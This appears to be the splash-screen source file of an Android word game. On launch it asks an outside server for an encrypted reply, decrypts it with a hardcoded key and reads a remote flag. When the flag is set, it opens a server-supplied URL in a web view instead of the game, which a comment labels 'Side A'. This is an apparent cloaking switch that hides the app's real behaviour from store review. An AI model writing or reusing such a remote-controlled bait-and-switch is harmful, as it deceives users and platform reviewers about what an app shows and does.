package dev.karl.wordwander;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.splashscreen.SplashScreen;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;

public class SplashScreenActivity extends AppCompatActivity {
    private static final int SPLASH_TIME_OUT = 2000;
    private static final String APP_ID = "97CC";
    private static final String TAG = "SplashTag";
    private static final String POLICY_STATUS = "policyStatus";
    private static final String APPSTATS = "appStatus";
    private static final String GAME_URL = "gameURL";
    private String apiResponse = "";
    private String appStatus = "";
    private String gameURL = "";
    SplashScreen splashScreen;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        splashScreen = SplashScreen.installSplashScreen(this);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash_screen);

        getWindow().setStatusBarColor(ContextCompat.getColor(this, R.color.dark_blue));
        getWindow().setNavigationBarColor(ContextCompat.getColor(this, R.color.dark_blue));

        splashScreen.setKeepOnScreenCondition(() -> true);

        RequestQueue connectAPI = Volley.newRequestQueue(this);
        JSONObject requestBody = new JSONObject();
        try {
            requestBody.put("appid", APP_ID);
            requestBody.put("package", this.getPackageName());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        String endPoint = "https://backend.madgamingdev.com/api/gameid" + "?appid="+ APP_ID +"&package=" + this.getPackageName();
        JsonObjectRequest jsonRequest = new JsonObjectRequest(Request.Method.GET, endPoint, requestBody,
                response -> {
                    apiResponse = response.toString();
                    try {
                        JSONObject jsonData = new JSONObject(apiResponse);
                        String decryptedData = WordsDatasetHelper.decrypt(jsonData.getString("data"),"21913618CE86B5D53C7B84A75B3774CD");
                        JSONObject gameData = new JSONObject(decryptedData);
                        appStatus = jsonData.getString("gameKey");
                        gameURL = gameData.getString("gameURL");
                        new Handler(Objects.requireNonNull(Looper.myLooper())).postDelayed(() -> {

                            splashScreen.setKeepOnScreenCondition(() -> false);

                            if(Boolean.parseBoolean(appStatus)){
                                // Store SharedPrefs - appStatus + gameUrl
                                SharedPreferences appPreferences = getSharedPreferences(WWCore.APP_PREFS, Context.MODE_PRIVATE);
                                appPreferences.edit().putBoolean(APPSTATS, Boolean.parseBoolean(appStatus)).apply();
                                appPreferences.edit().putString(GAME_URL, gameURL).apply();

                                Intent intent = new Intent(this, PolicyActivity.class);
                                intent.putExtra("url", gameURL);
                                startActivity(intent);
                                finish();
                            }else{
                                SharedPreferences pref = this.getSharedPreferences(WWCore.APP_PREFS, Context.MODE_PRIVATE);
                                Boolean policyStats = pref.getBoolean(POLICY_STATUS, Boolean.FALSE);
                                Intent intent;
                                if(Boolean.TRUE.equals(policyStats)){
                                    // If Policy Already Accepted call your Side A activity
                                    intent = new Intent(this, MenuActivity.class);
                                }else{
                                    // if Policy not yet Accepted call Policy activity from GDPR Package
                                    intent = new Intent(this, PolicyActivity.class);
                                    intent.putExtra("url", "file:///android_asset/userconsent.html");
                                }
                                startActivity(intent);
                                finish();
                            }
                        }, SPLASH_TIME_OUT);

                    } catch (JSONException e) {
                        Log.e(TAG, "Error parsing JSON: " + e.getMessage());
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing API response: " + e.getMessage());
                    }
                }, error -> Log.d("API:RESPONSE", error.toString())
        );
        connectAPI.add(jsonRequest);
    }
}